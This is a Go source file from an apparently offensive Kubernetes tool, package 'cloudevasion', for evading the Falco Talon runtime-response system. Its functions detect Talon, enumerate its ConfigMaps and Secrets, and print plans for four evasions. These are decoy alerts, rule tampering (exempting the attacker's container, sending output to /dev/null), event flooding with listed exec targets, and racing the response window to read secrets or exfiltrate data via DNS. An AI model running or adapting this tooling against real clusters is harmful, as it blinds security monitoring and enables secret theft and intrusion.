package cloudevasion

import (
	"context"
	"fmt"
	"strings"
	"time"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
)

func detectFalcoTalon(ctx context.Context, client kubernetes.Interface) []DetectionSystem {
	namespaces := []string{"falco", "falco-talon", "kube-system"}
	for _, ns := range namespaces {
		pods, err := client.CoreV1().Pods(ns).List(ctx, metav1.ListOptions{
			LabelSelector: "app.kubernetes.io/name=falco-talon",
		})
		if err == nil && len(pods.Items) > 0 {
			return []DetectionSystem{{
				Name:      "falco-talon",
				Detected:  true,
				Namespace: ns,
				Details:   fmt.Sprintf("%d falco-talon pods", len(pods.Items)),
			}}
		}

		deps, err := client.AppsV1().Deployments(ns).List(ctx, metav1.ListOptions{})
		if err == nil {
			for _, d := range deps.Items {
				if strings.Contains(d.Name, "falco-talon") || strings.Contains(d.Name, "falcosidekick") {
					return []DetectionSystem{{
						Name:      "falco-talon",
						Detected:  true,
						Namespace: ns,
						Details:   fmt.Sprintf("deployment: %s", d.Name),
					}}
				}
			}
		}
	}

	return nil
}

// EvadeFalcoTalon executes the specified Falco Talon evasion technique.
func EvadeFalcoTalon(ctx context.Context, client kubernetes.Interface, _ dynamic.Interface, technique string) (*EvasionResult, error) {
	switch technique {
	case "decoy":
		return talonDecoy(ctx, client)
	case "rule_modify":
		return talonRuleModify(ctx, client)
	case "saturate":
		return talonSaturate(ctx, client)
	case "response_race":
		return talonResponseRace(ctx, client)
	default:
		return talonDecoy(ctx, client)
	}
}

func talonDecoy(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Talon Decoy Distraction:\n\n")

	sb.WriteString("  Falco Talon automates responses to Falco alerts.\n")
	sb.WriteString("  Typical response actions: kill pod, label pod, network isolate.\n")
	sb.WriteString("  Strategy: trigger decoy alerts to exhaust response capacity.\n\n")

	sb.WriteString("  Decoy attack patterns:\n")
	sb.WriteString("    1. Spawn sacrificial pods that trigger known Falco rules\n")
	sb.WriteString("    2. Talon kills the decoy pods (expected behavior)\n")
	sb.WriteString("    3. While response engine is busy, execute real operation\n")
	sb.WriteString("    4. Talon has rate limits — flood with decoys to hit ceiling\n\n")

	sb.WriteString("  Rules that trigger automated response:\n")
	sb.WriteString("    - Terminal shell in container → kill pod\n")
	sb.WriteString("    - Sensitive file read (/etc/shadow) → label + alert\n")
	sb.WriteString("    - Network tool execution (nmap, curl to metadata) → isolate\n")
	sb.WriteString("    - Unexpected process spawn → kill container\n\n")

	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		LabelSelector: "falco-talon.response=true",
		Limit:         10,
	})
	if err == nil && len(pods.Items) > 0 {
		sb.WriteString("  Previously killed pods (Talon response labels):\n")
		for _, p := range pods.Items {
			fmt.Fprintf(&sb, "    %s/%s\n", p.Namespace, p.Name)
		}
	}

	sb.WriteString("  Timing window: Talon response cycle is typically 2-5 seconds\n")
	sb.WriteString("  After triggering decoy, execute real ops within that window\n")

	return &EvasionResult{
		Technique: "decoy",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func talonRuleModify(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Talon Rule Modification:\n\n")

	namespaces := []string{"falco", "falco-talon", "kube-system"}
	modified := false

	for _, ns := range namespaces {
		configMaps, err := client.CoreV1().ConfigMaps(ns).List(ctx, metav1.ListOptions{})
		if err != nil {
			continue
		}

		for _, cm := range configMaps.Items {
			if strings.Contains(cm.Name, "talon") || strings.Contains(cm.Name, "falcosidekick") {
				fmt.Fprintf(&sb, "  ConfigMap: %s/%s\n", ns, cm.Name)
				for key, val := range cm.Data {
					fmt.Fprintf(&sb, "    Key: %s (%d bytes)\n", key, len(val))
					if strings.Contains(key, "rules") || strings.Contains(key, "config") {
						preview := val
						if len(preview) > 300 {
							preview = preview[:300] + "..."
						}
						fmt.Fprintf(&sb, "    Content: %s\n\n", preview)
					}
				}
				modified = true
			}
		}
	}

	if !modified {
		sb.WriteString("  No Talon ConfigMaps found\n")
		sb.WriteString("  Talon may use file-based config mounted from Secret\n\n")

		for _, ns := range namespaces {
			secrets, err := client.CoreV1().Secrets(ns).List(ctx, metav1.ListOptions{})
			if err != nil {
				continue
			}
			for _, s := range secrets.Items {
				if strings.Contains(s.Name, "talon") {
					fmt.Fprintf(&sb, "  Secret: %s/%s (type=%s)\n", ns, s.Name, s.Type)
					for key := range s.Data {
						fmt.Fprintf(&sb, "    Key: %s\n", key)
					}
				}
			}
		}
	}

	sb.WriteString("\n  Modification targets:\n")
	sb.WriteString("    1. Change response action from 'kill' to 'label' (non-disruptive)\n")
	sb.WriteString("    2. Add exception for our container name/image\n")
	sb.WriteString("    3. Modify output destination to /dev/null\n")
	sb.WriteString("    4. Set priority filter to 'emergency' only (misses most rules)\n")
	sb.WriteString("    5. Add our namespace to the ignore list\n")

	return &EvasionResult{
		Technique: "rule_modify",
		Success:   modified,
		Output:    sb.String(),
	}, nil
}

func talonSaturate(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Talon Saturation Attack:\n\n")

	sb.WriteString("  Falco Talon processes alerts from Falco's output queue.\n")
	sb.WriteString("  Overwhelming Falco with events saturates Talon's input.\n")
	sb.WriteString("  When saturated, Talon drops events or delays responses.\n\n")

	sb.WriteString("  Saturation vectors:\n")
	sb.WriteString("    1. Mass file operations (trigger file access rules)\n")
	sb.WriteString("    2. Rapid container creation/deletion (trigger spawn rules)\n")
	sb.WriteString("    3. DNS request flood (trigger DNS rules if configured)\n")
	sb.WriteString("    4. Rapid exec into containers (trigger exec rules)\n\n")

	pods, err := client.CoreV1().Pods("").List(ctx, metav1.ListOptions{
		Limit: 5,
	})
	if err == nil && len(pods.Items) > 0 {
		sb.WriteString("  Available targets for exec-flood:\n")
		for _, p := range pods.Items {
			if p.Status.Phase == "Running" && p.Namespace != "kube-system" {
				fmt.Fprintf(&sb, "    %s/%s\n", p.Namespace, p.Name)
			}
		}
	}

	sb.WriteString("\n  Expected impact:\n")
	sb.WriteString("    - Falco event queue fills (grpc output buffer limit)\n")
	sb.WriteString("    - Talon goroutine pool exhausted\n")
	sb.WriteString("    - Response latency increases from ~2s to 30s+\n")
	sb.WriteString("    - Some events dropped entirely under sustained load\n")
	sb.WriteString("    - Real malicious ops executed during saturation window\n")

	return &EvasionResult{
		Technique: "saturate",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func talonResponseRace(ctx context.Context, client kubernetes.Interface) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Falco Talon Response Race:\n\n")

	sb.WriteString("  Falco Talon's response pipeline has inherent latency:\n")
	sb.WriteString("    Event occurs → Falco detects → gRPC to Talon → action executes\n")
	sb.WriteString("  Total latency: 1-5 seconds (best case)\n\n")

	sb.WriteString("  Race condition exploitation:\n")
	sb.WriteString("    1. Execute malicious action (triggers alert)\n")
	sb.WriteString("    2. Complete objective within response window (~2-3s)\n")
	sb.WriteString("    3. Self-terminate or clean up before kill action arrives\n\n")

	sb.WriteString("  Atomic operations that complete before response:\n")
	sb.WriteString("    - Read secret/configmap (single API call, <100ms)\n")
	sb.WriteString("    - Exfiltrate data via DNS (single packet)\n")
	sb.WriteString("    - Write to volume (filesystem op, <10ms)\n")
	sb.WriteString("    - Mutate cluster state (single API call)\n")
	sb.WriteString("    - Memory-only operations (no disk/network trace)\n\n")

	now := time.Now()
	sb.WriteString("  Validation: measure current response latency\n")
	_, err := client.CoreV1().Pods("default").List(ctx, metav1.ListOptions{Limit: 1})
	apiLatency := time.Since(now)
	if err == nil {
		fmt.Fprintf(&sb, "  API server latency: %s\n", apiLatency)
		fmt.Fprintf(&sb, "  Estimated Talon response: %s (API × pipeline stages)\n", apiLatency*5)
		sb.WriteString("  Any op completing faster than Talon response is invisible\n")
	}

	sb.WriteString("\n  Advanced: ephemeral container race\n")
	sb.WriteString("    - Launch ephemeral container, execute, exit before kill\n")
	sb.WriteString("    - Container is gone by the time Talon processes the alert\n")
	sb.WriteString("    - Talon's 'kill pod' action targets a pod already clean\n")

	return &EvasionResult{
		Technique: "response_race",
		Success:   true,
		Output:    sb.String(),
	}, nil
}
